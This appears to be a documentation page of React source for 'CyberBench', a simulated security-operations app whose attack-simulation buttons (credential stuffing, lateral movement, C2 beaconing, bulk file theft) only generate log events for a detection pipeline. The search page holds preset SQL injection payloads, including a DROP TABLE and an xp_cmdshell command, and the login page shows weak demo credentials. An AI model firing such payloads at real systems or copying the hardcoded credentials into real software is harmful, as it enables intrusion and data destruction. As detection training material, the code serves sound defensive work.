  const { handleLogin, loginAttempts, handleCredStuffing, credIdx, handleVPN } = useApp();
  const [u, setU] = useState(""); const [p, setP] = useState(""); const [shake, setShake] = useState(false);
  const prev = useRef(loginAttempts);
  useEffect(() => { if (loginAttempts > prev.current) { setShake(true); setTimeout(() => setShake(false), 500); } prev.current = loginAttempts; }, [loginAttempts]);

  return (
    <div className="flex items-center justify-center min-h-full p-8">
      <div className={`w-full max-w-[420px] bg-gradient-to-b from-[#0f172a] to-[#0a0f1e] border border-[#ffffff10] rounded-2xl p-10 shadow-2xl shadow-black/40 ${shake ? "animate-shake" : "animate-fadeUp"}`}>
        <div className="flex justify-center mb-4">
          <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#3b82f6] to-[#6366f1] flex items-center justify-center text-white text-xl font-bold shadow-lg shadow-blue-500/25">C</div>
        </div>
        <h1 className="text-2xl font-bold text-center text-[#f0f6ff] tracking-tight mb-1">CyberBench</h1>
        <p className="text-[13px] text-[#475569] text-center mb-7">Sign in to your workspace</p>
        {loginAttempts >= 3 && <div className="bg-red-500/8 border border-red-500/20 rounded-xl px-4 py-3 text-[11px] text-red-400 mb-4 flex items-center gap-2"><span className="text-base">⚠</span> Multiple failures detected — account may be locked</div>}
        <div className="mb-4">
          <label className="block text-[11px] text-[#64748b] mb-1.5 font-medium tracking-wider uppercase">Username</label>
          <input className="w-full bg-[#020617]/60 border border-[#ffffff10] rounded-xl px-4 py-2.5 text-[#e2e8f0] text-[13px] outline-none font-code placeholder:text-[#334155]" value={u} onChange={(e) => setU(e.target.value)} placeholder="Enter username" />
        </div>
        <div className="mb-5">
          <label className="block text-[11px] text-[#64748b] mb-1.5 font-medium tracking-wider uppercase">Password</label>
          <input className="w-full bg-[#020617]/60 border border-[#ffffff10] rounded-xl px-4 py-2.5 text-[#e2e8f0] text-[13px] outline-none font-code placeholder:text-[#334155]" type="password" value={p} onChange={(e) => setP(e.target.value)} onKeyDown={(e) => e.key === "Enter" && handleLogin(u, p)} placeholder="Enter password" />
        </div>
        <button className="w-full py-3 btn-primary rounded-xl text-white text-[13px] font-semibold" onClick={() => handleLogin(u, p)}>Sign In →</button>
        <p className="text-[10px] text-[#334155] text-center mt-3.5">Hint: admin / admin123 · jsmith / password</p>
        <div className="divider my-6" />
        <div className="text-[10px] text-[#475569] tracking-wider uppercase font-semibold mb-4">Attack Simulation</div>
        <div className="mb-4">
          <div className="text-[11px] text-[#64748b] mb-2 flex items-center gap-2 flex-wrap">
            <span className="text-[9px] px-2 py-0.5 rounded-full bg-orange-500/10 text-orange-400 font-semibold tracking-wider border border-orange-500/20">ATK-1B</span>
            <span className="font-medium text-[#94a3b8]">Credential Stuffing</span>
            <span className="text-[#334155]">— cycles breached pairs</span>
          </div>
          <button className="w-full py-2.5 border border-red-500/30 text-[#ef4444] rounded-xl text-[11px] tracking-wide text-left px-4 hover:bg-red-500/5 font-medium" onClick={handleCredStuffing}>Run Cred Pair {credIdx + 1}/5</button>
        </div>
        <div>
          <div className="text-[11px] text-[#64748b] mb-2 flex items-center gap-2">
            <span className="text-[9px] px-2 py-0.5 rounded-full bg-orange-500/10 text-orange-400 font-semibold tracking-wider border border-orange-500/20">ATK-1C</span>
            <span className="font-medium text-[#94a3b8]">VPN Login Attack</span>
          </div>
          <div className="flex gap-2.5">
            <button className="flex-1 py-2.5 border border-emerald-500/30 text-emerald-400 rounded-xl text-[11px] hover:bg-emerald-500/5 font-medium" onClick={() => handleVPN(true)}>VPN Login OK</button>
            <button className="flex-1 py-2.5 border border-red-500/30 text-red-400 rounded-xl text-[11px] hover:bg-red-500/5 font-medium" onClick={() => handleVPN(false)}>VPN Login Fail</button>
          </div>
        </div>
      </div>
    </div>
  );
}
```

---

## `src/components/DashboardPage.tsx`

> Full component (~140 lines) — includes navigation tiles, stats grid, and RL Self-Improvement panel with score trajectory visualization and dimension averages.

```tsx
"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { Search, FileText, Upload, Globe } from "lucide-react";
import { useApp } from "@/context/AppContext";
import { API_BASE } from "@/constants";
import type { RLStatus } from "@/types";

export function DashboardPage() {
  const { user, navigate } = useApp();
  const [rlStatus, setRlStatus] = useState<RLStatus | null>(null);
  const [rlLoading, setRlLoading] = useState(false);
  const rlPollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const pollRlStatus = useCallback(() => {
    if (rlPollRef.current) clearInterval(rlPollRef.current);
    rlPollRef.current = setInterval(async () => {
      try {
        const r = await fetch(`${API_BASE}/api/rl/status`);
        const data: RLStatus = await r.json();
        setRlStatus(data);
        if (data.status !== "running") {
          if (rlPollRef.current) clearInterval(rlPollRef.current);
          setRlLoading(false);
        }
      } catch { /* retry */ }
    }, 2000);
  }, []);

  useEffect(() => {
    fetch(`${API_BASE}/api/rl/status`).then(r => r.json()).then(setRlStatus).catch(() => {});
    return () => { if (rlPollRef.current) clearInterval(rlPollRef.current); };
  }, []);

  const startRlTraining = async (episodes: number) => {
    setRlLoading(true);
    try {
      await fetch(`${API_BASE}/api/rl/train`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ episodes, difficulty: "all", early_stop: 95.0 }),
      });
      pollRlStatus();
    } catch { setRlLoading(false); }
  };

  // ... tiles, stats grid, RL panel with score trajectory bar chart
  // See full source in web/src/components/DashboardPage.tsx
}
```

---

## `src/components/LogPanel.tsx`

```tsx
"use client";

import { useRef, useEffect } from "react";
import { useApp } from "@/context/AppContext";
import { LogRow } from "./LogRow";

export function LogPanel() {
  const { logs } = useApp();
  const logEndRef = useRef<HTMLDivElement>(null);
  useEffect(() => { logEndRef.current?.scrollIntoView({ behavior: "smooth" }); }, [logs]);

  return (
    <div className="flex-1 flex flex-col bg-[#020617]/50">
      <div className="flex items-center justify-between px-4 py-3 border-b border-[#ffffff06] shrink-0">
        <div className="flex items-center gap-2.5">
          <div className="flex items-center gap-1.5">
            <span className="w-2 h-2 rounded-full bg-red-500 shadow-sm shadow-red-500/50 animate-pulse" />
            <span className="text-[10px] font-semibold tracking-[0.15em] text-[#64748b] uppercase">SOC Log Stream</span>
          </div>
        </div>
        <div className="flex items-center gap-2 text-[10px]">
          <span className="px-2 py-0.5 rounded-full bg-[#ffffff05] text-[#475569] border border-[#ffffff08]">{logs.length} events</span>
          <span className="px-2 py-0.5 rounded-full bg-yellow-500/10 text-yellow-600 border border-yellow-500/15">{logs.filter((l) => l.trigger).length} triggers</span>
        </div>
      </div>
      <div className="flex-1 overflow-y-auto py-1">
        {logs.map((l) => <LogRow key={l.id} log={l} />)}
        <div ref={logEndRef} />
      </div>
    </div>
  );
}
```

---

## `src/components/LogRow.tsx`

```tsx
import { tagColor } from "@/constants";
import type { LogEntry } from "@/types";

export function LogRow({ log }: { log: LogEntry }) {
  const color = tagColor(log.tag);
  return (
    <div className="flex gap-2.5 items-start text-[11px] leading-relaxed px-3.5 py-1.5 mb-px animate-fadeIn transition-colors hover:bg-[#ffffff03]"
      style={{ borderLeft: `2px solid ${color}`, background: log.trigger ? "rgba(250,204,21,0.04)" : "transparent" }}>
      <span className="font-code text-[#334155] min-w-[60px] shrink-0 text-[10px]">{log.ts}</span>
      <span className="font-code text-[9px] px-1.5 py-0.5 rounded-md border font-semibold tracking-wide min-w-[120px] shrink-0 text-center"
        style={{ color, borderColor: color + "30", background: color + "10" }}>{log.tag}</span>
      <span className="font-code break-words flex-1 text-[10.5px]" style={{ color: log.trigger ? "#facc15" : "#94a3b8" }}>{log.message}</span>
    </div>
  );
}
```

---

## `src/components/BackBtn.tsx`

```tsx
"use client";

import { ArrowLeft } from "lucide-react";
import { useApp } from "@/context/AppContext";

export function BackBtn() {
  const { navigate } = useApp();
  return (
    <button className="inline-flex items-center gap-1.5 mb-5 text-[11px] text-[#475569] bg-transparent border-none cursor-pointer p-0 hover:text-[#94a3b8] font-medium transition-colors" onClick={() => navigate("dashboard")}>
      <ArrowLeft className="w-3.5 h-3.5" /> Back to Dashboard
    </button>
  );
}
```

---

## `src/components/ScoreBar.tsx`

```tsx
export function ScoreBar({ label, value }: { label: string; value: number }) {
  const pct = Math.min(100, Math.max(0, value));
  const color = pct >= 75 ? "#22c55e" : pct >= 45 ? "#f97316" : "#ef4444";
  return (
    <div className="bg-[#020617]/60 border border-[#ffffff08] rounded-xl p-3">
      <div className="flex justify-between text-[10px] mb-1.5">
        <span className="text-[#64748b] font-medium">{label}</span>
        <span className="font-bold" style={{ color }}>{value.toFixed(1)}</span>
      </div>
      <div className="h-1.5 bg-[#1e293b]/60 rounded-full overflow-hidden">
        <div className="h-full rounded-full transition-all duration-700 ease-out" style={{ width: `${pct}%`, background: `linear-gradient(90deg, ${color}cc, ${color})` }} />
      </div>
    </div>
  );
}
```

---

## `src/components/SearchPage.tsx`

```tsx
"use client";

import { useState } from "react";
import { useApp } from "@/context/AppContext";
import { BackBtn } from "./BackBtn";

export function SearchPage() {
  const { handleSearch } = useApp();
  const [q, setQ] = useState("");
  const sqli = ["' OR 1=1 --", "UNION SELECT username,password FROM users", "'; DROP TABLE sessions--", "1; EXEC xp_cmdshell('whoami')"];
  return (
    <div className="p-7 animate-fadeUp">
      <BackBtn />
      <h2 className="text-2xl font-bold text-[#f0f6ff] tracking-tight mb-1">Workspace Search</h2>
      <p className="text-[13px] text-[#475569] mb-5">Query documents, users and data</p>
      <div className="flex gap-3 mb-5">
        <input className="flex-1 bg-[#020617]/60 border border-[#ffffff10] rounded-xl px-4 py-2.5 text-[#e2e8f0] text-[13px] outline-none font-code placeholder:text-[#334155]" value={q} onChange={(e) => setQ(e.target.value)} onKeyDown={(e) => e.key === "Enter" && handleSearch(q)} placeholder="Search workspace..." />
        <button className="px-6 py-2.5 btn-primary rounded-xl text-white text-[13px] font-semibold" onClick={() => handleSearch(q)}>Search</button>
      </div>
      <div className="glass-card rounded-xl p-4">
        <div className="flex items-center gap-2 mb-2 text-[#94a3b8] font-semibold text-[11px]">
          <span className="text-[9px] px-2 py-0.5 rounded-full bg-orange-500/10 text-orange-400 font-semibold tracking-wider border border-orange-500/20">ATK-6</span>Web Attack Simulation
        </div>
        <p className="text-[11px] text-[#475569] leading-relaxed mb-3">Paste a payload below then hit Search, or click a preset:</p>
        <div className="flex flex-wrap gap-2">
          {sqli.map((s) => <button key={s} className="px-3 py-1.5 bg-[#020617]/60 border border-[#ffffff08] rounded-full text-[#64748b] text-[11px] hover:border-[#ffffff15] hover:text-[#94a3b8] font-code" onClick={() => setQ(s)}>{s}</button>)}
        </div>
      </div>
    </div>
  );
}
```

---

## `src/components/DocumentsPage.tsx`

```tsx
"use client";

import { useState } from "react";
import { useApp } from "@/context/AppContext";
import { BackBtn } from "./BackBtn";
import type { DocEntry } from "@/types";

export function DocumentsPage() {
  const { docs, handleFileAccess } = useApp();
  const [opened, setOpened] = useState<number[]>([]);
  const sc: Record<string, string> = { CONFIDENTIAL: "#f97316", RESTRICTED: "#ef4444", INTERNAL: "#3b82f6", CRITICAL: "#dc2626" };
  const ti: Record<string, string> = { spreadsheet: "📊", csv: "📋", pdf: "📕", json: "📦", doc: "📝", zip: "🗜", env: "🔑" };
  const open = (doc: DocEntry) => { handleFileAccess(doc); setOpened((p) => [...new Set([...p, doc.id])]); };
  return (
    <div className="p-7 animate-fadeUp">
      <BackBtn />
      <h2 className="text-2xl font-bold text-[#f0f6ff] tracking-tight mb-1">Document Library</h2>
      <p className="text-[13px] text-[#475569] mb-5">Open 4+ files rapidly to trigger BULK_COPY → LARGE_UPLOAD</p>
      <div className="grid grid-cols-2 gap-3 mb-5">
        {docs.map((doc) => {
          const c = sc[doc.sens] || "#64748b";
          return (
            <div key={doc.id} className="glass-card rounded-xl p-4 transition-all" style={{ borderColor: opened.includes(doc.id) ? "rgba(59,130,246,0.3)" : undefined, boxShadow: opened.includes(doc.id) ? "0 0 20px rgba(59,130,246,0.1)" : undefined }}>
              <div className="flex justify-between items-start mb-2.5">
                <span className="text-xl">{ti[doc.type] || "📄"}</span>
                <span className="text-[9px] px-2 py-0.5 rounded-full border font-semibold tracking-wider" style={{ color: c, borderColor: c + "30", background: c + "10" }}>{doc.sens}</span>
              </div>
              <div className="text-xs text-[#e2e8f0] mb-0.5 font-code">{doc.name}</div>
              <div className="text-[10px] text-[#475569] mb-3">{doc.size}</div>
              <div className="flex gap-2">
                <button className="flex-1 py-1.5 btn-primary rounded-lg text-white text-[11px] font-medium" onClick={() => open(doc)}>Open</button>
                <button className="flex-1 py-1.5 bg-[#ffffff05] border border-[#ffffff10] rounded-lg text-[#94a3b8] text-[11px] hover:bg-[#ffffff08] font-medium" onClick={() => open(doc)}>↓ Download</button>
              </div>
            </div>
          );
        })}
      </div>
      <div className="glass-card rounded-xl p-4">
        <div className="flex items-center gap-2 text-[#94a3b8] font-semibold text-[11px]">
          <span className="text-[9px] px-2 py-0.5 rounded-full bg-orange-500/10 text-orange-400 font-semibold tracking-wider border border-orange-500/20">ATK-3</span>
          Data Theft — open 4+ files rapidly to trigger BULK_COPY → LARGE_UPLOAD
        </div>
      </div>
    </div>
  );
}
```

---

## `src/components/UploadPage.tsx`

```tsx
"use client";

import { useState } from "react";
import { useApp } from "@/context/AppContext";
import { BackBtn } from "./BackBtn";

export function UploadPage() {
  const { handleRunScript } = useApp();
  const scripts = ["invoice_macro.xlsm", "report_update.docm", "system_patch.bat", "helper_svc.exe", "update_tool.ps1"];
  const [ran, setRan] = useState<string[]>([]);
  const run = (name: string) => { handleRunScript(name); setRan((p) => [...p, name]); };
  return (
    <div className="p-7 animate-fadeUp">
      <BackBtn />
      <h2 className="text-2xl font-bold text-[#f0f6ff] tracking-tight mb-1">Scripts & File Upload</h2>
      <p className="text-[13px] text-[#475569] mb-5">Execute workspace scripts and upload documents</p>
      <div className="glass-card rounded-xl p-4 mb-5">
        <div className="flex items-center gap-2 mb-1.5 text-[#94a3b8] font-semibold text-[11px]">
          <span className="text-[9px] px-2 py-0.5 rounded-full bg-orange-500/10 text-orange-400 font-semibold tracking-wider border border-orange-500/20">ATK-4</span>Malware / Persistence Simulation
        </div>
        <p className="text-[11px] text-[#475569] leading-relaxed">Running any script below triggers: PROCESS_SPAWN → SCHED_TASK → REG_WRITE</p>
      </div>
      <div className="flex flex-col gap-2.5">
        {scripts.map((s) => (
          <div key={s} className="flex items-center gap-3.5 glass-card rounded-xl px-4 py-3.5" style={{ borderColor: ran.includes(s) ? "rgba(239,68,68,0.2)" : undefined }}>
            <div className="w-9 h-9 rounded-lg bg-[#ffffff05] flex items-center justify-center text-base">📜</div>
            <div className="flex-1"><div className="text-[13px] text-[#e2e8f0] font-code">{s}</div><div className="text-[10px] text-[#475569] mt-0.5">Workspace automation script</div></div>
            <button className="px-5 py-2 rounded-lg text-[11px] font-semibold"
              style={{ background: ran.includes(s) ? "rgba(239,68,68,0.1)" : "linear-gradient(135deg, #2563eb, #1d4ed8)", color: ran.includes(s) ? "#ef4444" : "#fff", border: ran.includes(s) ? "1px solid rgba(239,68,68,0.2)" : "none" }} onClick={() => run(s)}>
              {ran.includes(s) ? "Ran" : "Run"}
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}
```

---

## `src/components/NetworkPage.tsx`

```tsx
"use client";

import { useApp } from "@/context/AppContext";
import { BackBtn } from "./BackBtn";

export function NetworkPage() {
  const { handleC2Beacon, handleLateralMove, lateralStep } = useApp();
  return (
    <div className="p-7 animate-fadeUp">
      <BackBtn />
      <h2 className="text-2xl font-bold text-[#f0f6ff] tracking-tight mb-1">Network & Servers</h2>
      <p className="text-[13px] text-[#475569] mb-5">Internal server access and external connectivity</p>
      <div className="glass-card rounded-xl p-5 mb-4">
        <div className="flex items-center gap-2.5 mb-3">
          <span className="text-[9px] px-2 py-0.5 rounded-full bg-orange-500/10 text-orange-400 font-semibold tracking-wider border border-orange-500/20">ATK-2</span>
          <span className="text-sm font-semibold text-[#e2e8f0]">Internal Breach — Lateral Movement</span>
        </div>
        <p className="text-[11px] text-[#475569] leading-relaxed mb-4">Pivots service account across internal hosts with LDAP enumeration. Triggers pipeline after 3 hops.</p>
        <div className="flex gap-2.5 flex-wrap mb-4">
          {["DC01", "WEB02", "APP03", "DB04", "FILE05"].map((h, i) => (
            <div key={h} className="px-3.5 py-2.5 rounded-xl border text-[11px] text-center leading-relaxed transition-all font-medium"
              style={{ background: i < lateralStep ? "rgba(34,197,94,0.08)" : "rgba(255,255,255,0.02)", borderColor: i < lateralStep ? "rgba(34,197,94,0.2)" : "rgba(255,255,255,0.06)", color: i < lateralStep ? "#22c55e" : "#475569" }}>
              {h}<br /><span className="text-[9px] font-normal">{i < lateralStep ? "compromised" : "clean"}</span>
            </div>
          ))}
        </div>
        <button className="w-full py-2.5 border border-blue-500/30 text-[#3b82f6] rounded-xl text-[11px] tracking-wide hover:bg-blue-500/5 font-medium" onClick={handleLateralMove}>
          Access Internal Server [{lateralStep} hops]
        </button>
      </div>
      <div className="glass-card rounded-xl p-5" style={{ borderColor: "rgba(239,68,68,0.15)" }}>
        <div className="flex items-center gap-2.5 mb-3">
          <span className="text-[9px] px-2 py-0.5 rounded-full bg-orange-500/10 text-orange-400 font-semibold tracking-wider border border-orange-500/20">ATK-5</span>
          <span className="text-sm font-semibold text-[#e2e8f0]">C2 Communication — DNS Beacon + Outbound Traffic</span>
        </div>
        <p className="text-[11px] text-[#475569] leading-relaxed mb-4">Initiates a DNS beacon to a threat-actor domain followed by encrypted outbound traffic.</p>
        <button className="w-full py-2.5 border border-red-500/30 text-red-400 rounded-xl text-[11px] tracking-wide hover:bg-red-500/5 font-medium" onClick={handleC2Beacon}>Connect to External Server</button>
      </div>
    </div>
  );
}
```

---

## `src/components/AgentPipeline.tsx`

> Full-screen modal showing real-time agent pipeline progress with animated cards and connection lines. (~170 lines)

See full source in [web/src/components/AgentPipeline.tsx](../web/src/components/AgentPipeline.tsx).

---

## `src/components/ResultsModal.tsx`

> Full-screen results modal showing algorithmic scores (6 bars), qualitative scores (3 bars), agent confidence, pipeline agents, strengths/gaps/recommendation, and RL feedback panel. (~120 lines)

See full source in [web/src/components/ResultsModal.tsx](../web/src/components/ResultsModal.tsx).

---

## `src/components/PipelineInspector.tsx`

> Full-screen pipeline replay with 6 agent cards showing typed-out log lines, actual vs expected output comparison, and score display. (~230 lines)

See full source in [web/src/components/PipelineInspector.tsx](../web/src/components/PipelineInspector.tsx).
